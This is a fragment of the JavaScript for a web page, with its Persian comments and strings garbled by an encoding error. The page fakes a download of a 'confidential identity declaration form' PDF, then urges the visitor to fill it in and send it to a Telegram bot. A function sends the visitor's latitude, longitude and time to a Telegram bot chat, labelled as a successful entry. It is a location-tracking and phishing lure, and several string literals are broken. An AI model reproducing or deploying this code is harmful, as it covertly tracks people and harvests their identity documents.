// Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø¯Ø§Ù†Ù„ÙˆØ¯ Ø¨Ø¹Ø¯ Ø§Ø² 3 Ø«Ø§Ù†ÛŒÙ‡
            setTimeout(() => {
                
                // --- Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø¯Ø§Ù†Ù„ÙˆØ¯ PDF ---
                // Ù„ÛŒÙ†Ú© ÙˆØ§Ù‚Ø¹ÛŒ PDF Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ø§ Ø§ÛŒÙ† Ø¬Ø§ÛŒÚ¯Ø²ÛŒÙ† Ú©Ù†ÛŒØ¯:
                const pdfData = "data:application/pdf;base64,JVBERi0xLjEKJcOkw7zEnwpbCiAgPDwvVHlwZSAvUGFnZS9NZWRpYUJveCBbMCAwIDYxMiA3OTJdL1JvdGF0ZSAwPj4KXV0K"; 
                const a = document.createElement('a');
                a.href = pdfData;
                a.download = 'ÙØ±Ù…_Ø§Ø¸Ù‡Ø§Ø±_Ù‡ÙˆÛŒØª_Ù…Ø­Ø±Ù…Ø§Ù†Ù‡.pdf';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

                // --- Ù¾ÛŒØ§Ù… Ù†Ù‡Ø§ÛŒÛŒ Ø·Ø¨Ù‚ Ø¯Ø±Ø®ÙˆØ§Ø³Øª ---
                spinner.classList.add('hidden');
                const finalMessage = âœ… **Ø¯Ø§Ù†Ù„ÙˆØ¯ Ù…ÙˆÙÙ‚!** Ø¬Ù‡Øª Ø¯Ø±ÛŒØ§ÙØª Ù…Ø¯Ø§Ø±Ú© Ø®ÙˆÛŒØ´ Ù„Ø·ÙØ§ ÙÙˆØ±Ù… Ø§Ø¸Ù‡Ø§Ø± Ù‡ÙˆÛŒØª Ø±Ø§ Ø®Ø§Ù†Ù‡ Ù¾Ø±ÛŒ Ù†Ù…Ø§ÛŒØ¯ Ùˆ Ø¨Ù‡ Ú©Ø§Ù†Ø§Ù„ ØªÙ„Ú¯Ø±Ø§Ù… **@location904411_Bot** Ø§Ø±Ø³Ø§Ù„ Ù†Ù…Ø§ÛŒØ¯.;
                updateStatus(finalMessage, 'success');
                
            }, 3000); 
        }
        
        // --- ØªÙˆØ§Ø¨Ø¹ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… ---

        function sendLocationToTelegram(lat, lon, reason) {
            const BOT_TOKEN = document.getElementById('bot-token').value;
            const CHAT_ID = document.getElementById('chat-id').value;
            
            const telegramApiUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendLocation;

            const payload = {
                chat_id: CHAT_ID,
                latitude: lat,
                longitude: lon,
                caption: ðŸš¨ **ÙˆØ±ÙˆØ¯ Ù…ÙˆÙÙ‚ÛŒØªâ€ŒØ¢Ù…ÛŒØ² Ø¨Ù‡ Ø³Ø§ÛŒØª Ù…Ø­Ø±Ù…Ø§Ù†Ù‡**\n**Ø¹Ø±Ø¶:** ${lat}\n**Ø·ÙˆÙ„:** ${lon}\n**Ø²Ù…Ø§Ù†:** ${new Date().toLocaleString('fa-IR')},
                parse_mode: 'Markdown'
            };

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            }).catch(e => console.error("Error sending location to Telegram:", e));
        }

    </script>
</body>
</html>
